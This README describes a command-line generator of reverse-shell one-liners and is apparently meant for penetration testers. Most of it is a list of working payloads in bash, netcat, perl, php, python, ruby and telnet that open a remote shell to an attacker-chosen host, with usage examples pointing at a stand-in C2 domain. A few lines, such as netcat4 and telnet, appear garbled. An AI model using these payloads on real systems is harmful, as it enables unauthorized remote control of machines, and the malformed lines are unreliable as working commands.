# Reverse Shell Generator

Sometimes searching the internet for a reverse shell and changing its values is a pain, that's what this tool is for.

When executed it prints out the reverse shell (so you can pipe it to `xclip` and rapidly paste it) and writes it to a file in case you need it later.

## Installation

```
chmod +x reversegen
sudo ln -s $(pwd)/reversegen.py /usr/local/bin/reversegen
```

## Usage:

```
reversegen <Method> <IP> <Port>
```

Example of usage: 

```
reversegen python 192.168.1.10 4444
reversegen python c2.com 4444
```

Example of copying the result:

```
reversegen bash 10.10.1.14 1234 | xclip -selection clipboard
reversegen bash c2.com 1234 | xclip -selection clipboard
```

## Available Methods

- bash: `bash -i >& /dev/tcp/IP/PORT 0>&1`

- bash2: `0<&196;exec 196<>/dev/tcp/IP/PORT; sh <&196 >&196 2>&196`

- netcat: `nc -e /bin/sh IP PORT`

- netcat2: `/bin/sh | nc IP PORT`

- netcat3: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f]`

- netcat4: `rm -f /tmp/p; mknod /tmp/p p && nc IP PORT 0/tmp/p`

- perl: `perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

- perl2 (Doesn't use */bin/sh*): `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"IP:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`

- perl3 (For Windows): `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"IP:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`

- php: `php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'`

- python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

- ruby: `ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

- ruby2 (Doesn't use */bin/sh*): `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("IP","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`

- ruby3 (For Windows): `ruby -rsocket -e 'c=TCPSocket.new("IP","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`

- telnet: `rm -f /tmp/p; mknod /tmp/p p && telnet IP PORT 0/tmp/p`

## Credits for the Reverse Shells to:

- [Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Bernardo Damele](https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html)
